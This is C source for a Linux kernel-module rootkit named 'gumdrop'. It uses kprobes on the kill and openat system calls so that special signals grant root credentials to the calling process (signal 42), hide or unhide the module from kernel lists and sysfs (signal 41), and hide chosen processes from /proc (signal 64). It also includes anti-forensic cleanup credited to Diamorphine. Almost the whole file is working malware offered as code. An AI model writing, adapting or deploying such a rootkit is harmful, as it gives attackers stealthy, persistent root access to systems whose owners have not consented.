#include <asm-generic/errno-base.h>
#include <asm/uaccess.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/proc_ns.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/signal.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ceald");
MODULE_DESCRIPTION("gumdrop");
MODULE_VERSION("0.01");

// hide and unhide kernel module

static short hidden = 0;
static struct list_head *prev_module;

struct kobject mod_kobj;
struct kobject *parent;

// Store return value for kobject_create_and_add()
struct kobject *returnval;
const char *name;

pid_t HIDE_ME[32];
size_t HIDE_ME_COUNT = 0;
#define HIDE_ME_MAX 32

static inline void
tidy(void) { // more sneaky beaky stuff (copied from Diamorphine)
  // Freeing
  kfree(THIS_MODULE->notes_attrs);
  THIS_MODULE->notes_attrs = NULL;

  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;

  kfree(THIS_MODULE->mkobj.mp);
  THIS_MODULE->mkobj.mp = NULL;
  THIS_MODULE->modinfo_attrs->attr.name = NULL;

  kfree(THIS_MODULE->mkobj.drivers_dir);
  THIS_MODULE->mkobj.drivers_dir = NULL;
}
void hide_kobj(void) {
  mod_kobj = (((struct module *)(THIS_MODULE))->mkobj).kobj;
  name = mod_kobj.name;
  parent = mod_kobj.parent;

  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del(&THIS_MODULE->mkobj.kobj.entry);
}
void hide_module(void) {
  prev_module = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  hidden = 1;
  hide_kobj();
  printk(KERN_INFO "sneaky beaky time..\n");
}

void unhide_kobj(void) {
  kobject_add(&THIS_MODULE->mkobj.kobj, parent, "%s", name);
}

void unhide(void) {
  list_add(&THIS_MODULE->list, prev_module);
  unhide_kobj();
  hidden = 0;
  printk(KERN_INFO "uh oh we've been discovered\n");
}

// end of hiding and unhiding

void give_woot(pid_t target_pid) {
  struct cred *newcreds;
  struct task_struct *task;
  rcu_read_lock();
  task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
  if (!task) {
    rcu_read_unlock();
    printk(KERN_INFO "cannot grant woot to PID: %d", target_pid);
    return;
  }
  printk(KERN_INFO "giving woot to: %d (%s)\n", task->pid, task->comm);
  newcreds = prepare_creds();
  if (!newcreds) {
    rcu_read_unlock();
    printk(KERN_INFO "cannot give woot (literally 1984)\n");
    return;
  }
  printk(KERN_INFO "gave woot!\n");
  newcreds->uid.val = newcreds->gid.val = 0;
  newcreds->euid.val = newcreds->egid.val = 0;
  newcreds->suid.val = newcreds->sgid.val = 0;
  newcreds->fsuid.val = newcreds->fsgid.val = 0;
  const struct cred *old = task->real_cred;
  rcu_assign_pointer(task->real_cred, newcreds);
  rcu_assign_pointer(task->cred, newcreds);
  rcu_read_unlock();
}
static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
  unsigned long *stack = (unsigned long *)regs->sp; // skip rest of system call
  return *stack;
}

int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
  struct pt_regs *real_regs;
  const char __user *user_filename;
  char filename[256];
  long bytes;

  real_regs = (struct pt_regs *)regs->di;
  user_filename = (const char __user *)real_regs->si;
  bytes = strncpy_from_user(filename, user_filename, sizeof(filename) - 1);
  if (bytes > 0) {
    filename[bytes] = '\0';
    if (sizeof(filename) != 0) {
      int i;
      for (i = 0; i < HIDE_ME_MAX; i++) {
        char str[20];
        sprintf(str, "/proc/%d", HIDE_ME[i]);
        if (strstr(filename, str) && HIDE_ME[i] != 0) {
          printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n", filename,
                 current->comm, current->pid);
          regs->ax = -ENOENT;
          regs->ip = get_syscall_return_addr(regs);
          return 1;
        }
      }
    }
  }
  return 0;
}

static struct kprobe kp[2];

static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
  int sig;
  struct pt_regs *real_regs;
  real_regs = (struct pt_regs *)regs->di;
  sig = (int)real_regs->si;
  pid_t target_pid;
  target_pid = current->pid;
  pid_t kill_this_pid = (pid_t)real_regs->di;
  if (sig == 42 &&
      target_pid ==
          kill_this_pid) { // if the signal code is 42 and if the process
                           // being targeted is the same as the source PID

    printk(KERN_INFO "the answer to everything!\n"); // 42!
    give_woot(target_pid); // give the current pid root
    regs->ax = 0;          // system call return code for kill

    regs->ip = get_syscall_return_addr(
        regs); // essentially "block" the signal from reaching the process.
    return 1;
  }
  if (sig == 41 && target_pid == kill_this_pid) { // hide and unhide the kit
    if (hidden == 0) {

      hide_module();
    } else {

      unhide();
    }
    regs->ax = 0;
    regs->ip = get_syscall_return_addr(regs);
    return 1;
  }
  if (sig == 64) {
    // hide processes
    int i;
    if (kill_this_pid == 0) {
      return 0;
    }
    for (i = 0; i < 32; i++) {
      if (HIDE_ME[i] == kill_this_pid) {
        printk(KERN_INFO "unhiding: %d\n", kill_this_pid);
        HIDE_ME[i] = 0;
        HIDE_ME_COUNT--;
        regs->ax = 0;
        regs->ip = get_syscall_return_addr(regs);
        return 1;
      }
    }
    printk(KERN_INFO "hiding: %d\n", kill_this_pid);
    if (HIDE_ME_COUNT < HIDE_ME_MAX + 1) {
      HIDE_ME[HIDE_ME_COUNT++] = kill_this_pid;
    } else {
      printk(KERN_INFO "cannot hide anymore!\n");
    }
    regs->ax = 0;
    regs->ip = get_syscall_return_addr(regs);
    return 1;
  }

  return 0;
}

static int __init gumdrop_init(void) {
  kp[0].symbol_name = "__x64_sys_kill";  // specify symbol for "kill"
  kp[0].pre_handler = haha_funny_number; // function for when kill is detected
  int ret = register_kprobe(&kp[0]);
  if (ret < 0) {
    printk(KERN_INFO "cannot register kill %d!\n", ret);
    return ret;
  }
  kp[1].symbol_name = "__x64_sys_openat";
  kp[1].pre_handler = monitor_handle;
  ret = register_kprobe(&kp[1]);
  if (ret < 0) {
    printk(KERN_INFO "cannot register openat %d\n", ret);
    return ret;
  }
  printk(KERN_INFO "Hewo pwincess!\n");
  // hide_module();
  // tidy();
  return ret;
}

static void __exit gumdrop_exit(void) {
  unregister_kprobe(&kp[0]);
  unregister_kprobe(&kp[1]);
  printk(KERN_INFO "bye!\n");
  return;
}

module_init(gumdrop_init);
module_exit(gumdrop_exit);
